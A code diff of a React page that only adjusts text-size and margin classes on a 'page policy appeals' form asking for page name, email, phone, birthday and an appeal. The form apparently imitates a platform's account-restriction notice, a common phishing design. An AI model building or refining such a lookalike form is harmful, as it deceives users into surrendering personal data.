@@ -316,14 +316,14 @@ const Home = () => {
                             <p className='text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                         </div>
                         {/* Sửa phần text mô tả - chỉ trên mobile */}
-                        <div className='p-4 text-sm leading-6 font-medium sm:text-sm sm:leading-6'>
-                            <p className='mb-3 text-base sm:text-sm'>{translatedTexts.detectedActivity}</p>
-                            <p className='mb-3 text-base sm:text-sm'>{translatedTexts.accessLimited}</p>
-                            <p className='text-base sm:text-sm'>{translatedTexts.submitAppeal}</p>
+                        <div className='p-4 text-sm leading-6 font-medium'>
+                            <p className='mb-3 sm:mb-0'>{translatedTexts.detectedActivity}</p>
+                            <p className='mb-3 sm:mb-0'>{translatedTexts.accessLimited}</p>
+                            <p className='sm:mb-0'>{translatedTexts.submitAppeal}</p>
                         </div>
                         <div className='flex flex-col gap-2 p-4 text-sm leading-6 font-semibold'>
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p>
                                     {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                 </p>
                                 <input 
@@ -338,7 +338,7 @@ const Home = () => {
                                 {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p>
                                     {translatedTexts.mail} <span className='text-red-500'>*</span>
                                 </p>
                                 <input 
@@ -353,7 +353,7 @@ const Home = () => {
                                 {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p>
                                     {translatedTexts.phone} <span className='text-red-500'>*</span>
                                 </p>
                                 <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
@@ -373,7 +373,7 @@ const Home = () => {
                                 {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
                                 <input 
@@ -389,7 +389,7 @@ const Home = () => {
                             
                             {/* Thêm ô Your Appeal - Textarea lớn */}
                             <div className='flex flex-col gap-2'>
-                                <p className='text-base sm:text-sm'>
+                                <p>
                                     {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
                                 </p>
                                 <textarea 
